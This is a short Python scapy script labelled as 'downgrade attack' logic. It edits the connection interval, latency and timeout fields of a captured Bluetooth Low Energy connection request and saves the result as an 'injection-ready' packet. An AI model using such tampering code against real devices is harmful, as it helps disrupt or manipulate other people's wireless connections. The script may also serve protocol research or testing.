#Downgrade Attack logic
from scapy.all import *
from scapy.layers.bluetooth import *

packets = rdpcap("BLE.pcap")
for packet in packets:
    if packet.haslayer(BTLE_CONNECT_REQ):
       packet[BTLE_CONNECT_REQ].interval = 0x0040 #Set to lower value
       packet[BTLE_CONNECT_REQ].latency = 0x0000 #Set to zero
       packet[BTLE_CONNECT_REQ].timeout = 0x01f4 #Set to lower value
       wrpcap("injection_ready.pcap", packet)
       break
